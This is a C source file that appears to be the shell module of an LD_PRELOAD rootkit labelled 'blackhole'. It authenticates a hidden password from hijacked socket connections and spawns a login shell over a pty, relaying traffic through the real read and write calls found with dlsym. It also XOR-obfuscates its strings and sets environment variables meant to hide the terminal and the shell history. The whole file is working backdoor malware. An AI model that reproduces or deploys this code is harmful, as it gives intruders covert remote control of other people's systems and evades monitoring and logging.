#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <pty.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dlfcn.h>

#include "etc.h"
#include "shell.h"

void setup_pty(int sock, int *pty, int *tty) {
    char *args[] = {strdup(SHELL_TYPE), "-l", 0};
    char *env[] = {strdup(HIDE_TERM_VAR), strdup(HIST_FILE), strdup(TERM), 0};

    close(0); // stdin
    close(1); // stdout
    close(2); // stderr
    close(*pty); // PTY master
    close(sock); // socket

    setsid(); // creates a new session, detaching it from any controlling terminal
    ioctl(*tty, TIOCSCTTY); // sets the tty terminal as the session control terminal

    signal(SIGHUP, SIG_DFL);
    signal(SIGCHLD, SIG_DFL);

    dup2(*tty, 0); // stdin
    dup2(*tty, 1); // stdout
    dup2(*tty, 2); // stderr

    xor(args[0]);
    xor(env[0]);
    xor(env[1]);
    xor(env[2]);

    //execle(args[0], args[0], args[1], args[2], env); // execute shell with environment variables
    execle(args[0], args[0], "-l", (char *) NULL, env); // execute shell with environment variables

    cleanup(args[0], strlen(args[0]));
    cleanup(env[0], strlen(env[0]));
	  cleanup(env[1], strlen(env[1]));
	  cleanup(env[2], strlen(env[2]));

    // If execle fails
    perror("execle");
    exit(EXIT_FAILURE);
}

void shell_listener(int sock, int pty) {
    fd_set fds;
    char buf[MAX_LEN];
    int res, maxfd;

    ssize_t (*s_read)();
    ssize_t (*s_write)();

    char *sys_write = strdup(SYS_WRITE);
    char *sys_read = strdup(SYS_READ);

    xor(sys_write);
		xor(sys_read);

    s_read = dlsym(RTLD_NEXT, sys_read);
    s_write = dlsym(RTLD_NEXT, sys_write);

    cleanup(sys_write, strlen(sys_write));
    cleanup(sys_read, strlen(sys_read));

    maxfd = pty;
    if (sock > maxfd) {
        maxfd = sock;
    }

    while (1) {
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        FD_SET(pty, &fds);

        if ((res=select(maxfd+1, &fds, NULL, NULL, NULL)) == -1) {
            DEBUG("[blackhole]: Select failed\n");
            break; // exit loop on select failure
        }

        if (FD_ISSET(sock, &fds)) {
            memset(&buf, 0x00, MAX_LEN);

            if ((res=s_read(sock, buf, MAX_LEN)) <= 0) {
                if (res == 0) {
                    DEBUG("[blackhole]: Client disconnected\n");
                } else {
                    DEBUG("[blackhole]: Error reading from client\n");
                }
                break; // exit loop on read failure
            } else {
                write(pty, buf, res);
            }
        }

        if (FD_ISSET(pty, &fds)) {
            memset(&buf, 0x00, MAX_LEN);

            if ((res=read(pty, buf, MAX_LEN-31)) <= 0) {
                if (res == 0) {
                    DEBUG("[blackhole]: PTY closed\n");
                } else {
                    DEBUG("[blackhole]: Error reading from pty\n");
                }
                break; // exit loop on read failure
            } else {
                s_write(sock, buf, res);
            }
        }
    }

    close(sock);
    close(pty);
}

int check_shell_password(int sock) {
    char buffer[512];
    char *shell_passwd = strdup(SHELL_PASSWD);

    xor(shell_passwd);

    memset(buffer, 0x00, sizeof(buffer));

    read(sock, buffer, sizeof(buffer));

    if (strstr(buffer, shell_passwd)) {
        cleanup(shell_passwd, strlen(shell_passwd));
        return 1;
    }

    cleanup(shell_passwd, strlen(shell_passwd));

    return 0;
}

int start_shell(int sock, struct sockaddr *addr) {
    DEBUG("[blackhole]: start_shell called\n");

    char buffer[512];
    char *shell_msg = strdup(SHELL_MSG);
    int pid, pty, tty;

    ssize_t (*s_write)();

    xor(shell_msg);

    memset(buffer, 0x00, sizeof(buffer)); // reset buffer 

    if (addr == NULL) {
        DEBUG("[blackhole]: Error: addr is NULL\n");
        return -1;
    }

    if (addr->sa_family != AF_INET) {
        DEBUG("[blackhole]: Error: addr is not AF_INET\n");
        return -1;
    }

    if (!check_shell_password(sock)) {
        DEBUG("[blackhole]: Invalid shell password\n");
        shutdown(sock, SHUT_RDWR);
        close(sock);
        return -1;
    }

    char *sys_write = strdup(SYS_WRITE);

    xor(sys_write);

    s_write = dlsym(RTLD_NEXT, sys_write);

    cleanup(sys_write, strlen(sys_write));

    DEBUG("[blackhole]: Sending shell message to client\n");
    if (write(sock, shell_msg, strlen(shell_msg)) == -1) {
        perror("write");
        return -1;
    }

    char pty_name[51];

    if (openpty(&pty, &tty, pty_name, NULL, NULL) == -1) {
        DEBUG("[blackhole]: Error: failed to grab pty\n");
        return -1;
    }

    if ((pid = fork()) == -1) {
        close(sock);
        close(pty);
        close(tty);
        return -1;
    } else if (pid == 0) {
        setup_pty(sock, &pty, &tty); // configures the pty in the child process
    } else {
        close(tty); // closes the tty descriptor in the parent process
    }

    if ((pid = fork()) == -1) {
        close(sock);
        close(pty);
        return -1;
    } else if (pid == 0) {
        shell_listener(sock, pty);
        exit(0); // ensure child process exits after the shell loop
    } else {
        close(sock);
        close(pty);
        errno = ECONNABORTED;
        return -1;
    }
}

